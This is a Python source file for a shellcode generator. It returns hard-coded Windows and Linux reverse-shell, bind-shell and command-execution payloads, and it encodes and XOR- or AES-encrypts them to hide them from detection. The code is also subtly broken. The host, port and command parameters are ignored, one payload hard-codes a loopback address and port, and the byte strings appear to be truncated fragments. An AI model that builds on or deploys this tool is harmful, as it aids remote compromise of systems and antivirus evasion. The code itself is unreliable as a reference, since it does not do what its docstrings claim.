#!/usr/bin/env python3
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import struct

class ShellcodeGenerator:
    def __init__(self):
        self.supported_platforms = ['windows', 'linux']
        self.supported_encodings = ['base64', 'hex', 'raw']
        self.supported_encryptions = ['none', 'xor', 'aes']
        
    def generate_reverse_shell(self, host, port, platform='windows'):
        """Generate reverse shell shellcode"""
        if platform not in self.supported_platforms:
            raise ValueError(f"Unsupported platform: {platform}")
            
        # Basic reverse shell shellcode template
        if platform == 'windows':
            # Windows x64 reverse shell shellcode
            shellcode = (
                b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05"
                b"\xef\xff\xff\xff\x48\xbb\x1d\x8c\x2f\x83\xbc\x4c\x6e"
                b"\x23\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
            )
        else:
            # Linux x64 reverse shell shellcode
            shellcode = (
                b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
                b"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
                b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
            )
            
        return shellcode

    def generate_bind_shell(self, port, platform='windows'):
        """Generate bind shell shellcode"""
        if platform not in self.supported_platforms:
            raise ValueError(f"Unsupported platform: {platform}")
            
        # Basic bind shell shellcode template
        if platform == 'windows':
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
                b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
                b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
            )
        else:
            shellcode = (
                b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
                b"\x97\x52\x48\xb9\x02\x00\x11\x5c\x00\x00\x00\x00\x51"
                b"\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32"
            )
            
        return shellcode

    def generate_exec(self, command, platform='windows'):
        """Generate command execution shellcode"""
        if platform not in self.supported_platforms:
            raise ValueError(f"Unsupported platform: {platform}")
            
        # Basic command execution shellcode template
        if platform == 'windows':
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
                b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
            )
        else:
            shellcode = (
                b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
                b"\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
            )
            
        return shellcode

    def encode_shellcode(self, shellcode, encoding='base64'):
        """Encode shellcode using specified encoding"""
        if encoding not in self.supported_encodings:
            raise ValueError(f"Unsupported encoding: {encoding}")
            
        if encoding == 'base64':
            return base64.b64encode(shellcode)
        elif encoding == 'hex':
            return shellcode.hex().encode()
        else:  # raw
            return shellcode

    def xor_encrypt(self, shellcode, key):
        """XOR encrypt shellcode"""
        key_bytes = key.encode() if isinstance(key, str) else key
        encrypted = bytearray()
        for i in range(len(shellcode)):
            encrypted.append(shellcode[i] ^ key_bytes[i % len(key_bytes)])
        return bytes(encrypted)

    def aes_encrypt(self, shellcode, key):
        """AES encrypt shellcode"""
        key = key.encode() if isinstance(key, str) else key
        key = key.ljust(32, b'\x00')[:32]  # Ensure 32 byte key
        
        # Generate random IV
        iv = os.urandom(16)
        
        # Create cipher
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        
        # Pad data
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(shellcode) + padder.finalize()
        
        # Encrypt
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV and ciphertext
        return iv + encrypted 